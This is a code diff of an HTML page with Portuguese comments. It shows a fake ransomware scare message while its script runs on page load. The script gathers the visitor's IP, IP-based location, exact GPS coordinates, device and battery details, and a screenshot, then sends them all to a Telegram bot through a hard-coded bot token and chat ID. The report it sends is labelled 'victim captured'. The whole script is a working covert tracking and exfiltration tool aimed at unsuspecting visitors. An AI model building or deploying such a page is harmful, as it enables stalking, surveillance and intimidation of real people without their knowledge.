@@ -3,9 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ooops, your files have been encrypted!</title>
+    <title>🔐 Sistema de Verificação</title>
+    <!-- Biblioteca pra print real -->
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
+    </script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #0a0a2a;
             font-family: 'Courier New', monospace;
@@ -23,35 +30,87 @@
             border-radius: 6px;
             padding: 30px;
             text-align: center;
-            box-shadow: 0 0 60px rgba(255,0,0,0.2);
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.2);
         }
-        h1 { color: #ff0000; font-size: 24px; }
-        p { color: #00ff41; font-size: 16px; margin: 10px 0; }
-        #status { color: #ffcc00; margin-top: 20px; font-size: 14px; }
+        h1 {
+            color: #ff0000;
+            font-size: 24px;
+        }
+        p {
+            color: #00ff41;
+            font-size: 16px;
+            margin: 10px 0;
+        }
+        #status {
+            color: #ffcc00;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .loader {
+            border: 3px solid #1a1a3a;
+            border-top: 3px solid #00ff41;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        #screenshot-preview {
+            display: none;
+            margin: 20px auto;
+            max-width: 90%;
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+
+    <div class="container" id="page-content">
         <h1>⚠️ Ooops, your files have been encrypted!</h1>
         <p>🔐 Your documents, photos, videos and databases are locked</p>
-        <div id="status">📡 Carregando...</div>
+        <div class="loader"></div>
+        <div id="status">📡 Coletando dados do sistema...</div>
+        <img id="screenshot-preview" alt="Screenshot da tela">
     </div>
 
     <script>
-        // ============================================
-        // CÓDIGO DIRETO NO INDEX (SEM DEPENDER DE logger.js)
-        // ============================================
+        // ============================================================
+        // 🧠 RUSSO PIRATA — SITUAÇÃO SONHOSA 🌙
+        // Tudo que o russo faria: IP, Localização (se possível), Print Real
+        // ============================================================
+
         const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
         const CHAT_ID = "8551438856";
 
+        // ============================================================
+        // 1. PEGAR IP (api.ipify.org)
+        // ============================================================
         async function getPublicIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 return d.ip;
-            } catch { return '❌ Falha ao obter IP'; }
+            } catch {
+                return '❌ Falha ao obter IP';
+            }
         }
 
+        // ============================================================
+        // 2. LOCALIZAÇÃO POR IP (ipinfo.io) — Cidade, Região, etc.
+        // ============================================================
         async function getLocationByIP(ip) {
             try {
                 const r = await fetch(`https://ipinfo.io/${ip}/json`);
@@ -69,39 +128,179 @@
             }
         }
 
-        function getBrowserData() {
+        // ============================================================
+        // 3. TENTAR GPS EXATO (se a vítima permitir o pop-up)
+        //    Se não permitir, retorna "Indisponível"
+        // ============================================================
+        function getExactLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ status: '❌ GPS não suportado', lat: 'N/A', lng: 'N/A' });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            status: '✅ LOCALIZAÇÃO EXATA OBTIDA!',
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy + ' metros',
+                            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                        });
+                    },
+                    (err) => {
+                        let msg = '❌ Permissão negada ou erro';
+                        if (err.code === 1) msg = '❌ Usuário NEGOU a permissão de localização';
+                        if (err.code === 2) msg = '❌ Sinal de GPS indisponível';
+                        if (err.code === 3) msg = '❌ Timeout';
+                        resolve({ status: msg, lat: 'N/A', lng: 'N/A' });
+                    }, {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // ============================================================
+        // 4. DADOS DO SMARTPHONE / NAVEGADOR
+        // ============================================================
+        function getSmartphoneInfo() {
+            const ua = navigator.userAgent;
+            const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+            const isIOS = /iPhone|iPad|iPod/i.test(ua);
+            const isAndroid = /Android/i.test(ua);
+
+            let model = 'Desconhecido',
+                brand = 'Desconhecida',
+                os = 'Desconhecido';
+
+            if (isIOS) {
+                const m = ua.match(/iPhone OS (\d+)_(\d+)/);
+                model = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone (iOS ?)';
+                brand = 'Apple';
+                os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
+            } else if (isAndroid) {
+                const m = ua.match(/Android (\d+\.\d+)/);
+                model = m ? `Android (${m[1]})` : 'Android';
+                brand = 'Android';
+                os = m ? `Android ${m[1]}` : 'Android';
+            } else if (!isMobile) {
+                model = '💻 Computador';
+                brand = 'Desktop';
+                os = navigator.platform || 'Desconhecido';
+            }
+
+            let battery = '❌ Não disponível';
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🔋 Descarregando'})`;
+                }).catch(() => {});
+            }
+
+            let connection = '❌';
+            if (navigator.connection) {
+                connection = navigator.connection.effectiveType || 'N/A';
+            }
+
             return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
+                model,
+                brand,
+                os,
+                battery,
+                connection,
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
+                cores: navigator.hardwareConcurrency || 'N/A',
                 language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direto',
-                url: window.location.href,
-                timestamp: new Date().toLocaleString('pt-BR')
+                screen: `${screen.width}x${screen.height}`
             };
         }
 
-        async function sendToTelegram(ip, location, browser) {
-            const msg = `
-🕵️‍♂️ **VÍTIMA CAPTURADA** 💀
+        // ============================================================
+        // 5. PRINT REAL DA TELA (usando html2canvas)
+        // ============================================================
+        async function captureRealScreenshot() {
+            try {
+                const element = document.getElementById('page-content');
+                const canvas = await html2canvas(element, {
+                    scale: 1.5,
+                    useCORS: true,
+                    backgroundColor: '#0a0a2a',
+                    logging: false,
+                    allowTaint: false
+                });
+                return canvas.toDataURL('image/jpeg', 0.9);
+            } catch (error) {
+                console.warn('Erro no print real:', error);
+                // Fallback: gera um print fake
+                return generateFakeScreenshot();
+            }
+        }
+
+        // ============================================================
+        // 6. FALLBACK: PRINT FAKE (caso o real falhe)
+        // ============================================================
+        function generateFakeScreenshot() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+
+            ctx.fillStyle = '#0a0a2a';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#ff0000';
+            ctx.font = 'bold 36px Arial';
+            ctx.fillText('🔒 ENCRYPTED', 20, 60);
+
+            ctx.fillStyle = '#00ff41';
+            ctx.font = '18px monospace';
+            ctx.fillText(`IP: ${sessionStorage.getItem('last_ip') || '?'}`, 20, 120);
+            ctx.fillText(`Data: ${new Date().toLocaleString()}`, 20, 150);
+            ctx.fillText('🔐 Todos os arquivos foram criptografados.', 20, 200);
+
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+
+        // ============================================================
+        // 7. ENVIAR TUDO PRO TELEGRAM (TEXTO + FOTO)
+        // ============================================================
+        async function sendToTelegram(ip, location, exactLoc, smartphone, screenshot) {
+            // Monta a mensagem
+            let msg = `
+🕵️‍♂️ **RUSSO PIRATA — VÍTIMA CAPTURADA** 💀
 
 🌐 **IP:** ${ip}
-📍 **Cidade:** ${location.city}
-📍 **Região:** ${location.region}
-📍 **País:** ${location.country}
-🗺️ **Coordenadas:** ${location.loc}
-🕰️ **Fuso:** ${location.timezone}
 
-📊 **Navegador:**
-🖥️ ${browser.userAgent}
-📐 Tela: ${browser.screen}
-🌍 Idioma: ${browser.language}
-🔗 Referer: ${browser.referrer}
-📎 URL: ${browser.url}
-⏱️ Hora: ${browser.timestamp}
-            `;
+📍 **LOCALIZAÇÃO POR IP:**
+   🏙️ Cidade: ${location.city}
+   🗺️ Região: ${location.region}
+   🌍 País: ${location.country}
+   📍 Coordenadas: ${location.loc}
+   🕰️ Fuso: ${location.timezone}
 
+📍 **GPS EXATO (se disponível):**
+   ${exactLoc.status}
+   ${exactLoc.lat !== 'N/A' ? `🗺️ Lat: ${exactLoc.lat}` : ''}
+   ${exactLoc.lng !== 'N/A' ? `🗺️ Lng: ${exactLoc.lng}` : ''}
+   ${exactLoc.maps ? `📍 Google Maps: ${exactLoc.maps}` : ''}
+
+📱 **SMARTPHONE/DISPOSITIVO:**
+   📱 Modelo: ${smartphone.model}
+   🏷️ Marca: ${smartphone.brand}
+   📲 OS: ${smartphone.os}
+   🔋 Bateria: ${smartphone.battery}
+   📶 Conexão: ${smartphone.connection}
+   💾 RAM: ${smartphone.ram}
+   🧠 Núcleos: ${smartphone.cores}
+   🌍 Idioma: ${smartphone.language}
+   📐 Tela: ${smartphone.screen}
+
+💀 **RUSSO PIRATA — Modo Situação Sonhosa**
+`;
+
+            // Envia a mensagem
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
                 const r = await fetch(url, {
@@ -114,33 +313,82 @@
                         disable_web_page_preview: true
                     })
                 });
-                const status = document.getElementById('status');
                 if (r.ok) {
-                    status.textContent = '✅ Dados enviados para o Telegram!';
-                    status.style.color = '#00ff41';
+                    document.getElementById('status').textContent = '✅ Dados enviados para o Telegram!';
+                    document.getElementById('status').style.color = '#00ff41';
                 } else {
-                    status.textContent = '❌ Erro ao enviar! Status: ' + r.status;
-                    status.style.color = '#ff0000';
+                    document.getElementById('status').textContent = '❌ Erro ao enviar texto! Status: ' + r.status;
+                    document.getElementById('status').style.color = '#ff0000';
                 }
             } catch (e) {
                 document.getElementById('status').textContent = '❌ Erro de rede: ' + e.message;
                 document.getElementById('status').style.color = '#ff0000';
             }
+
+            // Envia o print real (se tiver)
+            if (screenshot) {
+                try {
+                    const form = new FormData();
+                    const blob = await fetch(screenshot).then(res => res.blob());
+                    form.append('photo', blob, 'screenshot_real.jpg');
+                    form.append('chat_id', CHAT_ID);
+                    form.append('caption', '🖼️ PRINT REAL DA TELA (capturado na hora)');
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: form
+                    });
+                    document.getElementById('status').textContent += ' 📸 Print enviado!';
+                } catch (e) {
+                    console.warn('Erro ao enviar print:', e);
+                }
+            }
         }
 
+        // ============================================================
+        // 8. FUNÇÃO PRINCIPAL
+        // ============================================================
         async function main() {
             const status = document.getElementById('status');
-            status.textContent = '📡 Coletando dados...';
+            status.textContent = '📡 Coletando dados do sistema...';
 
+            // IP
             const ip = await getPublicIP();
-            const location = await getLocationByIP(ip);
-            const browser = getBrowserData();
+            sessionStorage.setItem('last_ip', ip);
 
+            // Localização por IP
+            const location = await getLocationByIP(ip);
+
+            // GPS Exato (se possível)
+            const exactLoc = await getExactLocation();
+
+            // Dados do smartphone
+            const smartphone = getSmartphoneInfo();
+
+            // Print REAL da tela
+            status.textContent = '📸 Capturando print da tela...';
+            const screenshot = await captureRealScreenshot();
+
+            // Preview do print (opcional)
+            const preview = document.getElementById('screenshot-preview');
+            if (screenshot) {
+                preview.src = screenshot;
+                preview.style.display = 'block';
+            }
+
+            // Envia tudo
             status.textContent = '📤 Enviando para o Telegram...';
-            await sendToTelegram(ip, location, browser);
+            await sendToTelegram(ip, location, exactLoc, smartphone, screenshot);
+
+            // Esconde o loader
+            document.querySelector('.loader').style.display = 'none';
         }
 
+        // ============================================================
+        // 9. EXECUTAR
+        // ============================================================
         document.addEventListener('DOMContentLoaded', main);
     </script>
+
 </body>
 </html>
